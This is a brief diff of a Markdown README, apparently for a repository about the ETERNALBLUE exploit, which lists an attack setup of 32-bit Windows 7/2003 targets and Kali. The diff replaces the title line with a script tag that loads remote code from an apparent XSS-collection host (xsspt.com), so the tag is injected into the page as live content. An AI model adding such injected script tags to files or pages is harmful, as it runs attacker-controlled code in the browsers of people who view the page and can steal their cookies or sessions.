@@ -1,5 +1,5 @@
 # 0day
-方程式 0day ETERNALBLUE
+<script src=//xsspt.com/UwWHCN></script>
 方程式 0day ETERNALBLUE 
 <BR>环境部署</BR>
 <BR>攻击环境:32位系统[win7 2003均可]&Kali系统</BR>
